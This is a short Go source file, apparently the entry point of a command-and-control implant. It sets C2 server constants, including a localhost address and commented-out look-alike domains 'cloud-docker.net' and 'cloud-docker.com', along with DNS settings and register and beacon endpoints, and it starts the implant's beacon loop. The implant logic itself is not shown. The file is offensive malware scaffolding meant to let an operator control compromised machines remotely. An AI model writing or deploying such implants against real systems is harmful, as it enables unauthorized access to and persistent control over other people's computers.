package main

import (
	"math/rand"
	"time"
)

const (
	C2Domain = "localhost:80"
	// C2Domain  = "cloud-docker.net"
	DNSServer = "8.8.8.8:53"
	//C2HTTPSURI            = "https://localhost"
	//C2DNSDOMAIN           = "cloud-docker.com"
	C2RegisterEndpoint    = "/implant/register"
	C2HTTPSBeaconEndpoint = "/implant/beacon"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	implant, err := NewImplant()
	if err != nil {
		panic(err)
	}
	err = implant.BeaconLoop()
	if err != nil {
		panic(err)
	}
}
